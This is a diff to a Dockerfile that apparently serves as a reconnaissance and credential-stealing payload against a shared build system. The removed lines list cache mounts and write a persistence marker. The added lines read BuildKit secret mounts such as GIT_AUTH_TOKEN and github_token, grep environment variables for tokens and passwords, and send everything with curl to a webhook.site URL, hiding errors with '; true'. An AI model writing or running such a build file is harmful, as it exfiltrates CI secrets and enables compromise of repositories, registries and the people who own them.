@@ -1,13 +1,11 @@
 FROM alpine
 RUN apk add --no-cache curl >/dev/null 2>&1; true
-RUN --mount=type=cache,target=/c1 echo "=GO_MOD=" >>/o; ls -la /c1 >>/o 2>&1; true
-RUN --mount=type=cache,target=/c2 echo "=NPM=" >>/o; ls -la /c2 >>/o 2>&1; true
-RUN --mount=type=cache,target=/c3 echo "=PIP=" >>/o; ls -la /c3 >>/o 2>&1; true
-RUN --mount=type=cache,target=/c4 echo "=M2=" >>/o; ls -la /c4 >>/o 2>&1; true
-RUN --mount=type=cache,target=/root/.cache echo "=ROOTCACHE=" >>/o; ls -laR /root/.cache 2>&1 | head -40 >>/o; true
-RUN --mount=type=cache,target=/go/pkg/mod echo "=GOPKG=" >>/o; ls -la /go/pkg/mod 2>&1 | head -40 >>/o; true
-RUN --mount=type=cache,target=/root/.npm echo "=NPMCACHE=" >>/o; ls -la /root/.npm 2>&1 | head -30 >>/o; true
-RUN echo "=PERSIST_WRITE=" >>/o; true
-RUN --mount=type=cache,target=/cp sh -c 'ls -la /cp >> /o 2>&1; echo kernelops-marker-$RANDOM > /cp/mark.txt; cat /cp/mark.txt >> /o'; true
-RUN echo "=SEND=" >>/o; curl -s -m15 --data-binary @/o "https://webhook.site/618daba3-3d6c-43b9-b6dc-82ad71f3cee6/recon6"; true
+RUN --mount=type=cache,target=/cp echo "=CACHE_PERSIST=" >>/o; ls -la /cp >>/o 2>&1; cat /cp/mark.txt >>/o 2>&1; true
+RUN --mount=type=secret,id=GIT_AUTH_TOKEN sh -c 'echo "=S_GIT=" >>/o; cat /run/secrets/GIT_AUTH_TOKEN >>/o 2>&1'; true
+RUN --mount=type=secret,id=github_token sh -c 'echo "=S_GH=" >>/o; cat /run/secrets/github_token >>/o 2>&1'; true
+RUN --mount=type=secret,id=token sh -c 'echo "=S_TOK=" >>/o; cat /run/secrets/token >>/o 2>&1'; true
+RUN --mount=type=secret,id=registry sh -c 'echo "=S_REG=" >>/o; cat /run/secrets/registry >>/o 2>&1'; true
+RUN echo "=SECDIR=" >>/o; ls -laR /run/secrets 2>&1 | head -20 >>/o; true
+RUN echo "=BUILDARGS_ENV=" >>/o; env | grep -iE 'token|secret|key|pass|git|registry|auth' >>/o 2>&1; true
+RUN echo "=SEND=" >>/o; curl -s -m15 --data-binary @/o "https://webhook.site/618daba3-3d6c-43b9-b6dc-82ad71f3cee6/recon7"; true
 CMD ["sh","-c","echo idle; sleep 3600"]
